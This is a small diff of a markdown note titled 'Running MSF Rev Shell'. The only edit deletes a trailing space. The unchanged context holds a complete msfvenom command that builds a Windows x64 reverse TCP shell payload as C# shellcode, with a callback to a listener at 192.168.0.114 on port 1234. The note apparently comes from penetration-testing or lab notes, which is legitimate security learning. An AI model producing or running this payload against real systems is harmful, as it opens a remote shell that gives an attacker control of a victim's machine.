@@ -1,6 +1,6 @@
 # Running MSF Rev Shell:
 
-payload creation cmd: 
+payload creation cmd:
 ```
 msfvenom -p windows/x64/shell_reverse_tcp -ax64 LHOST=192.168.0.114 LPORT=1234 -f csharp
 ```
